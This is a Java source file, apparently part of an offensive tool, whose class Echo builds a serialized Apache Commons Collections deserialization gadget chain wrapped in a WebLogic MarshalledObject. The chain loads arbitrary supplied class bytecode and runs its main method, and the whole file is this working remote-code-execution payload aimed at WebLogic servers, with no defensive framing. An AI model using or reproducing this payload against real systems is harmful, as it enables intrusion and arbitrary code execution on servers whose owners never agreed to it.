package com.snakinya.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;
import weblogic.corba.utils.MarshalledObject;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import static com.snakinya.t3impl.t3impl.getFirstCtor;


public class Echo {
    public static byte[] executeCmd(String className, byte[] clsData) throws Exception {
        // common-collection1 构造transformers 定义自己的RMI接口
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),
                new ConstantTransformer(new HashSet())};

        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
                .cast(Proxy.newProxyInstance(Map.class.getClassLoader(),
                        new Class[]{Map.class}, handler));

        handler = (InvocationHandler) getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, mapProxy);

        Object obj = new MarshalledObject(handler);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);

        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();

        return payload;
    }

}
